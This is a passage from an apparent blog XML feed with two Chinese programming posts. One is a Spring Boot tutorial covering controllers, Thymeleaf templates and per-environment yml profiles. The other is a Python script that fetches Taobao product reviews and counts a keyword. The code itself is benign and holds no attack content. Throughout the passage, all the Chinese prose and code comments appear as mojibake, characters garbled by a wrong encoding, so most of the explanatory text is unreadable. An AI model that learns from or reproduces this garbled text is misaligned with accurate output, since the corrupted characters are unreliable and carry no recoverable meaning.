Tomcat started on port(s): 8080ï¼Œè¡¨ç¤ºTomcatå¯åŠ¨å®Œæ¯•ï¼Œé»˜è®¤å ç”¨çš„æ˜¯8080ç«¯å£ï¼Œè¿™æ˜¯ä¸€ä¸ªå†…åµŒçš„Tomcatï¼ŒåŽç»­å¯ä»¥é«˜åº¦å®šåˆ¶ã€‚ ä¸ºäº†å¯ä»¥åœ¨æµè§ˆå™¨ä¸­è®¿é—®åˆ°é¡¹ç›®ï¼Œæˆ‘ä»¬éœ€è¦æ·»åŠ ä¸€ä¸ªæŽ§åˆ¶å™¨ï¼Œå¹¶ä¸”æä¾›è®¿é—®åœ°å€å’Œå“åº”æ•°æ®ã€‚ä¸ºäº†æ–¹ä¾¿è¿™é‡Œç›´æŽ¥åœ¨Appç±»ä¸­æ·»åŠ ,æœ€ç»ˆçš„Appç±»å¦‚ä¸‹æ‰€ç¤ºï¼š123456789101112131415161718/** * Spring Bootç¤ºä¾‹ç¨‹åº * @author è“å£«é’¦ */@SpringBootApplication@Controllerpublic class App &#123; public static void main(String[] args) &#123; SpringApplication.run(App.class,args); &#125; @ResponseBody @RequestMapping("/hello") public String hello()&#123; return "Hello, Spring Boot!"; &#125;&#125; åœ¨ç±»ä¸Šæ·»åŠ @Controllerï¼Œè¡¨ç¤ºè¿™ä¸ªç±»ä½œä¸ºæŽ§åˆ¶å™¨å±‚ï¼Œ åœ¨ç±»ä¸­æ·»åŠ ä¸€ä¸ªæ–¹æ³•helloï¼Œç”¨æ¥è¿”å›žä¸€ä¸ªå­—ç¬¦ä¸²ã€‚æ–¹æ³•ä¸Šçš„@RequestMapping(â€œ/helloâ€)æ³¨è§£è¡¨ç¤ºè¯¥æ–¹æ³•å¯ä»¥å“åº”ç”¨æˆ·çš„urlè¯·æ±‚ä¸º/helloã€‚@responseBodyæ³¨è§£çš„ä½œç”¨æ˜¯å°†controllerçš„æ–¹æ³•è¿”å›žçš„å¯¹è±¡é€šè¿‡é€‚å½“çš„è½¬æ¢å™¨è½¬æ¢ä¸ºæŒ‡å®šçš„æ ¼å¼ä¹‹åŽï¼Œå†™å…¥åˆ°responseå¯¹è±¡çš„bodyåŒºï¼Œé€šå¸¸ç”¨æ¥è¿”å›žJSONæ•°æ®æˆ–è€…æ˜¯XMLã€‚Spring Bootå¯¹@responseBodyåšäº†é»˜è®¤çš„é…ç½®ï¼Œå¦‚æžœè¿”å›žçš„æ˜¯ä¸€ä¸ªç”¨æˆ·å®šä¹‰çš„å¯¹è±¡ï¼Œé‚£ä¹ˆè¿™ä¸ªå¯¹è±¡å°†ä¼šè‡ªåŠ¨è¢«è§£æžæˆJSONè¾“å‡ºã€‚ç”±äºŽè¿™é‡Œæ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æµè§ˆå™¨è®¿é—®è¿™ä¸ªæ–¹æ³•æ—¶å°†ç›´æŽ¥è¾“å‡ºå­—ç¬¦ä¸²ã€‚æ‰“å¼€æµè§ˆå™¨è¾“å…¥ http://localhost:8080/hello é€šè¿‡ç®€å•çš„3ä¸ªæ­¥éª¤ï¼Œå°±å¯ä»¥å°†æ™®é€šçš„Javaé¡¹ç›®å˜æˆWebé¡¹ç›®ï¼Œé€šè¿‡æµè§ˆå™¨å¯ä»¥ç›´æŽ¥è®¿é—®åˆ°ã€‚å¦‚æžœè¿”å›žçš„æ˜¯ç”¨æˆ·è‡ªå®šä¹‰ç±»åž‹ï¼Œåœ¨æ–¹æ³•ä¸Šé¢æ·»åŠ @ResponseBodyå°†ä¼šä»¥JSONçš„å½¢å¼è¿”å›ž123456789@ResponseBody@RequestMapping("/info")public User info()&#123; User user = new User(); user.setName("è“å£«é’¦"); user.setSex("ç”·"); user.setAge(23); return user;&#125; æµè§ˆå™¨è®¿é—® http://localhost:8080/info å¯ä»¥çœ‹åˆ°Spring Boot é»˜è®¤ä¸º@ResponseBodyæ³¨è§£æ·»åŠ äº†è§†å›¾è½¬æ¢ä¸ºJSONï¼Œå¼€å‘äººå‘˜å¯ä»¥ä¸éœ€è¦å†å•ç‹¬é…ç½®ï¼Œéžå¸¸æ–¹ä¾¿ã€‚ç„¶è€ŒSpring Bootçš„å¼ºå¤§ä¹‹å¤„å¹¶ä¸åœ¨è¿™é‡Œï¼Œè¿™æ‰æ˜¯åˆšåˆšå¼€å§‹ã€‚ ä¸‰ã€ä½¿ç”¨æ­£ç¡®çš„å§¿åŠ¿åˆ›å»ºSpring Booté¡¹ç›® IntelliJ IDEAå¯¹Spring Bootçš„æ”¯æŒéžå¸¸å‹å¥½åˆ›å»ºé¡¹ç›®æ—¶é€‰æ‹©Spring Initializ å³å¯åˆ›å»ºSpring Booté¡¹ç›®ã€‚å¯ä»¥é€‰æ‹©Mavenæˆ–è€…Gradleæ¥æž„å»ºé¡¹ç›®ï¼ŒSpring Bootç›®å‰æ”¯æŒJavaã€Kotlinã€Groovyè¯­è¨€ï¼Œè¿™é‡Œä½¿ç”¨Gradleæ¥æž„å»ºé¡¹ç›®ï¼Œè¯­è¨€é€‰æ‹©ä½¿ç”¨Javaã€‚å¯ä»¥ä¸ºSpring Booté¡¹ç›®æ·»åŠ ç¬¬ä¸‰æ–¹ä¾èµ–ï¼Œè¿™äº›åº“ä¹Ÿå¯ä»¥åŽç»­æ‰‹åŠ¨å¼•å…¥ï¼Œç›®å‰å°±åŠ ä¸€ä¸ªwebæ¨¡å—çš„ä¾èµ–ã€‚é¡¹ç›®æž„å»ºå¥½åŽå¯ä»¥çœ‹åˆ°å¦‚ä¸Šå›¾æ‰€ç¤ºçš„ç»“æž„ã€‚Spring Bootæ¨¡æ¿åŒ–äº†å·¥ç¨‹ç›®å½•ï¼Œæ— éœ€ä»»ä½•é…ç½®å°±å¯ä»¥ç›´æŽ¥è¿è¡Œã€‚ src/mainæ¨¡å—ä¸‹é»˜è®¤åˆ†ä¸ºjavaæºä»£ç ç›®å½•å’Œresourcesèµ„æºç›®å½•src/main/java ç”¨æ¥å­˜æ”¾Javaä»£ç resources/static/é»˜è®¤æŒ‡å®šç”¨æ¥å­˜æ”¾é™æ€èµ„æºï¼Œæ¯”å¦‚imagesã€cssã€jsä»¥åŠhtmlç­‰ã€‚resources/templates/è¡¨ç¤ºæ¨¡æ¿ç›®å½•ï¼Œç”¨æ¥å­˜æ”¾htmlæ¨¡æ¿ï¼Œè¿™é‡Œçš„æ–‡ä»¶èµ„æºé»˜è®¤éœ€è¦é€šè¿‡æŽ§åˆ¶å™¨mvcçš„æ–¹å¼æ¥è®¿é—®ã€‚resources/application.propertiesæ˜¯é¡¹ç›®çš„é…ç½®æ–‡ä»¶ã€‚ Spring Booté»˜è®¤å·²ç»å¸®æˆ‘ä»¬åšäº†å„ç§é…ç½®äº†ï¼Œå¯ä»¥æ ¹æ®éœ€è¦è¿›è¡Œå•ç‹¬é…ç½®ï¼ŒIDEAå¼ºå¤§çš„é™æ€ä»£ç åˆ†æžåŠŸèƒ½å¯ä»¥ç»™å¼€å‘äººå‘˜å¾ˆæ™ºèƒ½çš„æç¤º ä¿®æ”¹äº†é»˜è®¤ç«¯å£å·ä¸º8000ï¼Œä¸Šä¸‹æ–‡åœ°å€ä¸º/boot åœ¨resources/static/ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªindex.htmlï¼Œç„¶åŽå¯åŠ¨é¡¹ç›®é€šè¿‡åœ°å€ http://localhost:8000/boot/index.html å³å¯è®¿é—®åˆ°é¡µé¢ Spring Boot ç›®å‰æ”¯æŒThymeleaf ã€Freemarkerã€Mustacheã€ Groovy Templatesæ¨¡æ¿å¼•æ“Žã€‚Spring Boot å¾ˆå¤šç”¨äºŽapiæŽ¥å£æœåŠ¡çš„å¼€å‘ï¼Œæœ‰æ—¶å€™ä¹Ÿéœ€è¦ä½¿ç”¨æ¨¡æ¿å¼•æ“Žæ¥åšæ¸²æŸ“è§†å›¾ã€‚å®˜æ–¹ä¸æŽ¨èä½¿ç”¨jspæ¥åšæ¨¡æ¿å¼•æ“Žï¼Œå®˜æ–¹æŽ¨èä½¿ç”¨ Thymeleafæ¥åšè§†å›¾æ¨¡æ¿å¼•æ“Žï¼Œä½¿ç”¨å‰éœ€è¦åœ¨build.gradleä¸­æ·»åŠ Thymeleafçš„ä¾èµ–1compile('org.springframework.boot:spring-boot-starter-thymeleaf') Spring Boot å¯¹Thymeleafåšäº†é»˜è®¤é…ç½®ï¼Œprefix=classpath:/templates/ suffix=.htmlæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦åœ¨é…ç½®æ–‡ä»¶ä¸­é…ç½®ï¼Œé™¤éžéœ€è¦å®šåˆ¶ã€‚åœ¨resources/templates/ç›®å½•ä¸‹æ–°å»ºæ¨¡æ¿é¡µé¢ helloTpl.html12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang="en" xmlns:th="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;hello&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h2&gt;è¿™æ˜¯ä¸€ä¸ªæ¨¡æ¿é¡µé¢&lt;/h2&gt; &lt;div&gt; æŽ§åˆ¶å™¨ä¼ è¿‡æ¥çš„å€¼ä¸ºï¼š &lt;span th:text="$&#123;message&#125;"&gt;&lt;/span&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; Thymeleafæ¨¡æ¿å¼•æ“Žæœ‰å¾ˆå¤šä¾¿æ·å¼ºå¤§çš„è¡¨è¾¾å¼ï¼Œè¿™é‡Œåªè¾“å‡ºä¸€ä¸ªæŽ§åˆ¶å™¨ä¼ è¿‡æ¥çš„messageå€¼ï¼Œå…·ä½“ç”¨æ³•åŽç»­çš„æ–‡ç« å†è¯¦ç»†ä»‹ç»ã€‚æŽ¥ä¸‹æ¥åœ¨æŽ§åˆ¶å™¨ä¸­å®šä¹‰ä¸€ä¸ªæ–¹æ³•ï¼Œå‘é¡µé¢ä¼ å€¼ï¼Œå¹¶ä¸”è¿”å›žä¸€ä¸ªæ¨¡æ¿åå­—åç§°helloTplï¼ŒSpring Bootä¼šå¯¹è¯¥æ¨¡æ¿æ‹¼æŽ¥ä¸Šå‰åŽç¼€ï¼š æŽ§åˆ¶å™¨æ–¹æ³•å°†ä¼šè¿”å›ž classpath:/templates/helloTpl.html12345678910111213/** * æŽ§åˆ¶å™¨ç¤ºä¾‹ * @author è“å£«é’¦ */@Controllerpublic class HelloController &#123; @RequestMapping("/hello") public String hello(Model model)&#123; model.addAttribute("message","Hello,World!"); return "helloTpl"; &#125;&#125; è®¿é—®é¡µé¢ http://localhost:8000/boot/hello å°±å¯ä»¥çœ‹åˆ°helloTplæ¨¡æ¿è¢«æˆåŠŸæ¸²æŸ“è¾“å‡ºäº†ã€‚ Spring Booté»˜è®¤çš„é…ç½®æ–‡ä»¶ä¸º.propertiesï¼Œè¿™ç§é…ç½®å…¶å®žè¿˜ä¸å¤Ÿç®€æ´ï¼ŒçŽ°åœ¨å¾ˆæµè¡Œymlçš„é…ç½®æˆ‘ä»¬å¯ä»¥æŠŠé»˜è®¤çš„é…ç½®æ–‡ä»¶åˆ é™¤ï¼Œæ–°å»ºapplication.ymlï¼ŒSpring Bootåœ¨å¯åŠ¨æ—¶é»˜è®¤ä¼šåŠ è½½è¯¥é…ç½®æ–‡ä»¶ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬æœ¬åœ°å¼€å‘çš„é…ç½®å’Œæµ‹è¯•æœåŠ¡å™¨ä»¥åŠæ­£å¼ç”Ÿäº§æœåŠ¡å™¨è‚¯å®šæ˜¯æœ‰åŒºåˆ«çš„ï¼Œä¼ ç»Ÿçš„Spring é¡¹ç›®ä»Žå¼€å‘çŽ¯å¢ƒåˆ°æµ‹è¯•çŽ¯å¢ƒå’Œç”Ÿäº§çŽ¯å¢ƒçš„åˆ‡æ¢æ—¶éœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œä¸€èˆ¬é€šè¿‡æ³¨é‡Šçš„æ–¹å¼ï¼Œè¿™æ ·å¾ˆå®¹æ˜“å› ä¸ºè¯¯æ“ä½œå¯¼è‡´é…ç½®æ–‡ä»¶çš„é…ç½®æ˜¯é”™è¯¯çš„ï¼ŒSpring Bootä¸ºæˆ‘ä»¬è€ƒè™‘åˆ°äº†è¿™ä¸€ç‚¹ ä¸ºå¼€å‘(dev)ã€æµ‹è¯•(test)ã€ç”Ÿäº§ï¼ˆpro)çŽ¯å¢ƒåˆ†åˆ«å»ºç«‹ä¸åŒçš„é…ç½®æ–‡ä»¶ï¼Œåœ¨è¿è¡Œæˆ–æ‰“åŒ…æ—¶æŒ‡å®šè¯¥é…ç½®å³å¯ã€‚é…ç½®æ–‡ä»¶åç§°æ ¼å¼ï¼šapplication-è‡ªå®šä¹‰åç§°.ymlåœ¨application.ymlä¸­æŒ‡å®šåŠ è½½çš„ä¸ºdevï¼Œè¿™æ ·é¡¹ç›®å¯åŠ¨çš„æ—¶å€™å°±ä¼šåŠ è½½application-dev.ymlä¸­çš„é…ç½®application.yml123spring: profiles: active: dev åœ¨ä¸åŒçš„é…ç½®æ–‡ä»¶ä¸­ä¸ºé¡¹ç›®è®¾ç½®ä¸åŒçš„å¯åŠ¨ç«¯å£ï¼Œä»¥ç¤ºåŒºåˆ†application-dev.yml123# å¼€å‘çŽ¯å¢ƒserver: port: 8100 application-test.yml123# æµ‹è¯•çŽ¯å¢ƒserver: port: 8200 application-pro.yml123# ç”Ÿäº§çŽ¯å¢ƒserver: port: 8080 å¯åŠ¨æœåŠ¡ï¼Œé¡¹ç›®åŠ è½½application-dev.ymlçš„å¼€å‘çŽ¯å¢ƒé…ç½®ï¼ŒæœåŠ¡å°†ä¼šè¿è¡Œåœ¨8100ç«¯å£ã€‚http://localhost:8100/info ä¿®æ”¹é…ç½®æ–‡ä»¶application.yml æŒ‡å®šä¸ºæµ‹è¯•çŽ¯å¢ƒã€‚123spring: profiles: active: test æ­¤æ—¶è¿è¡Œé¡¹ç›®æˆ–è€…æ‰“æˆjaråŒ…è¿è¡Œæ—¶ï¼Œé¡¹ç›®å°†ä¼šåŠ è½½æµ‹è¯•çŽ¯å¢ƒçš„é…ç½®ç”¨Gradle buildé¡¹ç›®ï¼Œå°†ä¼šåœ¨libç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªjaråŒ…å°†jaråŒ…éƒ¨ç½²åˆ°æµ‹è¯•çŽ¯å¢ƒï¼Œä½¿ç”¨java -jar å‘½ä»¤ç›´æŽ¥è¿è¡Œ1java -jar spring-boot-0.0.1-SNAPSHOT.jar å¯ä»¥çœ‹åˆ°æœåŠ¡åŠ è½½äº†æµ‹è¯•çŽ¯å¢ƒçš„é…ç½®ï¼Œè¿è¡Œåœ¨8200çš„ç«¯å£ä¸Šã€‚ Spring Bootå’Œä¼ ç»Ÿçš„Springå¼€å‘ç›¸æ¯”ï¼Œä¸éœ€è¦ç¹ççš„æ¡†æž¶æ­å»ºé…ç½®ï¼Œå¼€å‘é€Ÿåº¦ä¸Šæœ‰è´¨çš„æå‡ã€‚Spring Bootè¿˜å¯ä»¥æ–¹ä¾¿çš„å’ŒHibernateä¸ŽMybatisç­‰æ¡†æž¶ä»¥åŠRedisã€å„ç§MQé›†æˆï¼Œå¹¶ä¸”æœ‰é»˜è®¤çš„é…ç½®ã€‚å¼€å‘è€…åªéœ€è¦å°‘é‡çš„é…ç½®å°±å¯ä»¥å¿«é€Ÿä½¿ç”¨å„ç§æ¡†æž¶æ¥å¼€å‘ï¼Œçµæ´»çš„åœ¨ä¸åŒçš„çŽ¯å¢ƒåˆ‡æ¢ã€‚å¼€å‘æ•ˆçŽ‡å¾—åˆ°è´¨çš„é£žè·ƒã€‚ æœ¬ç¯‡æ–‡ç« è®°å½•Spring Bootçš„åŸºæœ¬ä½¿ç”¨ï¼Œè¡Œäº‘æµæ°´çš„è¿‡äº†ä¸€éï¼Œè¿˜æœ‰å¾ˆå¤šåŠŸèƒ½æ²¡æœ‰è®°å½•ã€‚æ¯ä¸ªåŠŸèƒ½ç‚¹éƒ½å†™çš„ä¸æ·±ï¼Œä¹Ÿä¸å¤Ÿè¯¦ç»†ï¼Œåªæ˜¯ç®€å•çš„ä½¿ç”¨ï¼Œè¿™é‡Œå æ—¶ä»Žå®è§‚æ„Ÿå—ä¸Šå…ˆå¤§è‡´ç½—åˆ—ï¼ŒæŠ½ç©ºå†å¥½å¥½æ•´ç†ã€‚åŽç»­æˆ‘ä¼šåˆ†æ ¹æ®Spring Bootçš„ä¸åŒæ–¹é¢ï¼Œå•ç‹¬ç¼–å†™æŸä¸ªåŠŸèƒ½çš„æ–‡ç« æ¥ç³»ç»Ÿçš„è®°å½•Spring Bootçš„ç”¨æ³•ã€‚]]></content>
      <categories>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç¼–å†™çˆ¬è™«åˆ†æžå•†å“è¯„è®ºå†…å®¹]]></title>
    <url>%2F18296dc%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘çœ‹ä¸Šä¸€æ¬¾å¾ˆæ—¶å°šçš„æ°´æ¯ï¼Œæˆ‘è¦ä¹°çš„åˆè¡·å°±æ˜¯å› ä¸ºæ¯å­å¥½çœ‹ï¼Œä½†æ˜¯æˆ‘ä¹Ÿå¾ˆæ³¨é‡æ¯å­çš„è´¨é‡ï¼Œæ¯”å¦‚æ˜¯å¦æœ‰å¼‚å‘³ç­‰ã€‚è¿™æ¬¾å•†å“åœ¨æ·˜å®ä¸Šçš„è¯„è®ºæœ‰åå‡ ä¸‡æ¡ï¼Œé‡Œé¢æŽºæ‚ç€å„ç§å„æ ·çš„è¯„ä»·ï¼Œè¿™ä¹ˆå¤šè¯„è®ºä¸€æ¡ä¸€æ¡çš„çœ‹æ˜¾ç„¶æ˜¯ä¸ªç¬¨æ–¹æ³•ï¼Œæˆ‘çš„éœ€æ±‚å¾ˆç®€å•ï¼Œå°±æ˜¯æƒ³é©¬ä¸ŠçŸ¥é“è¿™ä¹ˆå¤šè¯„è®ºé‡Œç©¶ç«Ÿæœ‰å¤šå°‘äººè¯„è®ºæœ‰å¼‚å‘³ã€‚å¦‚æžœè´¨é‡ä¸è¿‡å…³ï¼Œæˆ‘é©¬ä¸Šæ¢å…¶ä»–å•†å“ï¼Œè¿™æ ·å¯ä»¥èŠ‚çœæˆ‘çš„è´­ç‰©æ—¶é—´ã€‚ä½œä¸ºä¸€åªç¨‹åºçŒ¿ï¼Œè¿™ç§ä½“åŠ›åŠ³åŠ¨å½“ç„¶æ˜¯è¦ç”¨ç¼–ç¨‹æ¥è§£å†³äº†ï¼Œåªéœ€è¦å†™ä¸€ä¸ªçˆ¬è™«å¹¶ä¸”åˆ†æžè¯„è®ºå†…å®¹å³å¯ã€‚ éžå¸¸ä¸­æ„è¿™æ¬¾æ°´æ¯ï¼Œé™¤äº†è¿™å‡ ç§æ¬¾å¼è¿˜æœ‰å…¶ä»–çš„é£Žæ ¼å¯ä»¥é€‰æ‹©å¹¶ä¸”å¯ä»¥å…è´¹åˆ»å­—ï¼Œé¢œå€¼å·²ç»è¾¾åˆ°äº†æˆ‘çš„è¦æ±‚ï¼Œå°±çœ‹è´¨é‡å¦‚ä½•äº†ã€‚æˆ‘çš„ç›®çš„å°±ä¸€ä¸ªï¼Œç¼–å†™ç¨‹åºæ¥è‡ªåŠ¨åˆ†æžè¯„è®ºå†…å®¹ï¼Œå¾—åˆ°æˆ‘æƒ³è¦çš„ç»“æžœï¼Œç„¶åŽå†³å®šä¹°ä¸ä¹°ã€‚ ç¼–ç¨‹çš„æœ€ç»ˆç›®çš„å°±æ˜¯ä¸ºäº†è§£å†³ç”Ÿæ´»ä¸­çš„å®žé™…é—®é¢˜ï¼Œè®©è®¡ç®—æœºä»£æ›¿äººç±»åŽ»åšä¸€äº›é‡å¤æ€§çš„å·¥ä½œã€‚ åœ¨ç¼–å†™å·¥å…·ç¨‹åºæ—¶ï¼Œæˆ‘ç”¨çš„æœ€å¤šçš„æ˜¯Pythonï¼Œæ¯‹åº¸ç½®ç–‘ä»–æ˜¯ç›®å‰ç”¨æ¥ç¼–å†™å·¥å…·ç¨‹åºæ•ˆçŽ‡æœ€é«˜çš„è¯­è¨€ä¹‹ä¸€ã€‚Pythonå‡­å€Ÿç€ç®€æ´çš„è¯­æ³•å’Œå¼ºå¤§çš„ç¬¬ä¸‰æ–¹åº“ï¼Œåœ¨è¿ç»´ã€æœºå™¨å­¦ä¹ ã€ä»¥åŠè‡ªåŠ¨åŒ–é¢†åŸŸæœ‰ç€éžå¸¸å¹¿æ³›çš„åº”ç”¨ã€‚ ä½¿ç”¨Pythonç¼–å†™è‡ªåŠ¨åŒ–ç¨‹åºæœ‰å¾ˆå¤šç§æ–¹å¼ï¼Œæ¯”å¦‚æˆ‘ä¹‹å‰ç”¨WebDriveråº“æ¥æŽ§åˆ¶æµè§ˆå™¨è¿›è¡Œè‡ªåŠ¨åŒ–æ“ä½œï¼Œè¿™ç§æ–¹å¼åŸºæœ¬ä¸Šå¯ä»¥è¯´æ˜¯å¾ˆæš´åŠ›ï¼Œä¸€èˆ¬çš„åçˆ¬è™«æ‰‹æ®µå¯¹è¿™ç§æ–¹æ³•éƒ½æ²¡æœ‰å¾ˆå¥½çš„è§£å†³æ–¹æ¡ˆï¼Œå› ä¸ºä»–çš„çš„ç¡®ç¡®æ˜¯çœŸçš„æµè§ˆå™¨åœ¨æ“ä½œï¼Œä¸è¿‡WebDriverä¸€èˆ¬ç”¨æ¥åšæµè§ˆå™¨ç«¯çš„è‡ªåŠ¨åŒ–æµ‹è¯•ã€‚çˆ¬è™«ç¨‹åºä¸€èˆ¬æ˜¯è‡ªå·±æž„é€ ä¸€ä¸ªå®¢æˆ·ç«¯åŽ»åšç½‘ç»œè¯·æ±‚ï¼Œä½¿ç”¨ä¸“é—¨çš„åº“åŽ»åšæ•°æ®çš„èŽ·å–å’Œè§£æžæ“ä½œï¼Œæ¯”å¦‚XPathç­‰ã€‚æœ‰äº›ç½‘é¡µæ˜¯é€šè¿‡ajaxç­‰æ–¹å¼æ¥å¼‚æ­¥åŠ è½½æ•°æ®çš„ï¼Œè¿™æ—¶å€™å°±è¦åˆ†æžå¹¶æ‰¾å‡ºç½‘é¡µæ•°æ®çš„è°ƒç”¨æŽ¥å£ï¼Œç„¶åŽå†ç”¨è‡ªå·±çš„ç¨‹åºåŽ»è‡ªåŠ¨åŒ–è°ƒç”¨ã€‚ é€šè¿‡åˆ†æžæ·˜å®çš„å®è´é“¾æŽ¥å’Œè¯„è®ºé¡µé¢çš„æ•°æ®èŽ·å–å¯ä»¥å‘çŽ°æ·˜å®æ˜¯é‡‡ç”¨å¼‚æ­¥è°ƒç”¨æ•°æ®çš„ï¼Œè¿”å›žçš„æ•°æ®æ˜¯jsonæ ¼å¼ï¼Œæ‰€ä»¥è¿™é‡Œç”¨ä¸åˆ°XPathï¼Œåªéœ€è¦è°ƒç”¨æŽ¥å£å¹¶ä¸”è§£æžjsonå³å¯ã€‚ è¦åšçš„æ­¥éª¤ ç¼–å†™çˆ¬è™«æ ¹æ®å®è´é“¾æŽ¥çˆ¬å–è¯„è®ºæ•°æ®å¹¶ä¿å­˜åˆ°æœ¬åœ°æ–‡ä»¶ åˆ†æžè¯„è®ºæ•°æ®é‡Œé¢çš„å…³é”®å­—å¾—åˆ°æ„Ÿå…´è¶£çš„å†…å®¹ ä¸è¯´åºŸè¯ï¼Œä¸Šä»£ç æ–°å»ºä¸€ä¸ªåˆ†æžæ·˜å®å•†å“è¯„è®ºçš„å·¥å…·ç±» taobao.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import requestsimport json# èŽ·å–å•†å“è¯„è®ºdef get_commodity_comments(order_url, file_name): # èŽ·å–å•†å“è¯„è®ºä¿¡æ¯ï¼Œè§£æžjsonæ•°æ® response_content = requests.get(order_url) response_json = json.loads(response_content.text.strip().strip('()')) # å•†å“è¯„è®ºæ¡æ•° total = response_json['total'] # å½“å‰è¯„è®ºæ‰€åœ¨é¡µæ•° page = 1 # å½“å‰è¯„è®ºæ‰€åœ¨è¡Œæ•° count = 0 # æ‰“å¼€æŒ‡å®šæ–‡ä»¶ï¼Œå‡†å¤‡å°†è¯·æ±‚åˆ°çš„æ•°æ®å†™å…¥åˆ°æ–‡ä»¶ä¸­ file = open(file_name, 'w') while count &lt; total: res = requests.get(order_url[:-1] + str(page)) page = page + 1 response_json = json.loads(res.text.strip().strip('()')) comments = response_json['comments'] if comments is None: return total for common_item in comments: file.writelines(common_item['user']['nick'] + 'è¯„è®º:' + common_item['content']) count = count + 1 # å…³é—­æ–‡ä»¶æµ file.close() return total# åˆ†æžè¯„è®ºï¼Œç»Ÿè®¡å…³é”®å­—åœ¨è¯„è®ºé‡Œå‡ºçŽ°çš„æ¬¡æ•°def analysis_commodity(file_name, key): file = open(file_name, 'r') content = file.read() return content.count(key)def select_keyword_count(commodity_link, key_word): # èŽ·å–é“¾æŽ¥ä¸­çš„å•†å“id order_id = commodity_link[commodity_link.find('&amp;id=') + 4:] # æ ¹æ®å•†å“idï¼ŒæŸ¥è¯¢è¯„è®ºæŽ¥å£ order_url = 'https://rate.taobao.com/feedRateList.htm?auctionNumId=' + order_id + '&amp;currentPageNum=1' # èŽ·å–å•†å“è¯„è®ºï¼Œä¿å­˜åˆ°æŒ‡å®šæ–‡ä»¶ï¼Œå¹¶ä¸”è¿”å›žå•†å“æ¡æ•° total = get_commodity_comments(order_url, order_id + '.txt') # æ ¹æ®å…³é”®å­—åˆ†æžè¯„è®ºï¼Œå¾—å‡ºåˆ†æžç»“æžœ keyword_count = analysis_commodity(order_id + '.txt', key_word) return total, keyword_count æ–°å»ºä¸€ä¸ªdemo.py ç”¨æ¥æµ‹è¯•åˆšåˆšå†™çš„å·¥å…·ç±»12345678910111213import taobaoif __name__ == '__main__': # å•†å“é“¾æŽ¥ commodity_link = 'https://detail.tmall.com/item.htm?spm=a220o.1000855.1000983.1.301635bfuvpObC&amp;id=557148927006' # è¦æŸ¥è¯¢çš„è¯„è®ºå…³é”®å­— key_word = 'æœ‰å¼‚å‘³' # æ‰§è¡ŒæŸ¥è¯¢è¿”å›žç»“æžœ total, keyword_count = taobao.select_keyword_count(commodity_link, key_word) print('æ‚¨é€‰æ‹©çš„å®è´å…±æœ‰', str(total), 'æ¡è¯„è®º', 'å…¶ä¸­æœ‰' + str(keyword_count), 'äººè¯„è®º', key_word) è¿è¡Œç¨‹åº,ç¨‹åºæ ¹æ®å•†å“é“¾æŽ¥ä¸­çš„å•†å“idä½œä¸ºæ–‡ä»¶åï¼Œå°†è¯„è®ºæ•°æ®å†™å…¥äº†æ–‡ä»¶ä¸­ã€‚ç¨‹åºå†æ¬¡è¯»å…¥æ–‡ä»¶ä¸­çš„è¯„è®ºæ•°æ®ï¼Œå¯¹å…³é”®å­—è¿›è¡Œç»Ÿè®¡ã€‚ é€šè¿‡æŽ§åˆ¶å°å¯ä»¥çœ‹åˆ°å½“å‰å•†å“è¯„è®ºä¸­æœ‰å¼‚å‘³çš„æœ‰85æ¡ã€‚ç„¶è€Œç®€å•çš„å­—ç¬¦ç»Ÿè®¡æ— æ³•åº”å¯¹ä¸­åŽæ–‡åŒ–çš„åšå¤§ç²¾æ·±ï¼Œ æœ‰å¼‚å‘³å‰é¢å¦‚æžœåŠ ä¸ªæ²¡,é‚£å°±å˜æˆäº†æ²¡æœ‰å¼‚å‘³è¿™å®Œå…¨æ˜¯ç›¸åçš„æ„æ€ã€‚è¿™æ˜¯ä¸€ä¸ªåŒ…å«å…³ç³»ï¼Œå½“å‰çš„ç»“æžœé‡Œé¢å¯èƒ½åŒ…å«äº†æ²¡æœ‰å¼‚å‘³çš„è¯„è®ºã€‚ è¿™é‡Œæœ¬åº”è¯¥ç”¨åˆ°æœºå™¨å­¦ä¹ ï¼Œä½†æ˜¯åœ¨è‡ªç„¶è¯­è¨€å¤„ç†æ–¹é¢å¾®è½¯æ—©å·²åšäº†å¾ˆå¤šå¹´äº†ï¼Œå¯¹ä¸ªäººæ¥è¯´è‡ªå·±åŽ»è®­ç»ƒæ•°æ®é›†åŽ»ç†è§£ç”¨æˆ·çš„è¯­ä¹‰çš„æˆæœ¬æ˜¯ç›¸å½“å¤§çš„ï¼ŒTensorFlowæˆ‘æŽ¥è§¦çš„ä¸å¤šï¼Œæœºå™¨å­¦ä¹ æ–¹é¢æˆ‘å¯ä»¥è¯´æ˜¯ä¸€ä¸ªå°ç™½ï¼Œç›®å‰æ²¡æœ‰èƒ½åŠ›åŽ»å†™å‡ºè¿™æ ·ä¸€ä¸ªå·ç§¯ç®—æ³•ã€‚ä¸è¿‡å¦‚æžœå°±é’ˆå¯¹ç›®å‰è¿™å½“ä¸ªè¯æ³•è€Œè¨€å´å˜å¾—ä¸é‚£ä¹ˆå¤æ‚ï¼Œå®Œå…¨å¯ä»¥é€šè¿‡ç¨‹åºå¤šé‡åˆ¤æ–­æ¥å¾—å‡ºå¤§è‡´çš„ç»“è®ºã€‚è¿™é‡Œç›®å‰å æ—¶å°±lowä¸€ç‚¹ï¼Œä¿®æ”¹å…³é”®è¯ä¸ºæ²¡æœ‰å¼‚å‘³å†è¿è¡Œä¸€æ¬¡ç¨‹åºï¼Œç„¶åŽæŠŠæœ‰å¼‚å‘³å‡åŽ»æ²¡æœ‰å¼‚å‘³ï¼Œæœ€åŽçš„ç»“æžœå°±æ˜¯æœ‰å¼‚å‘³çš„è¯„è®ºã€‚ 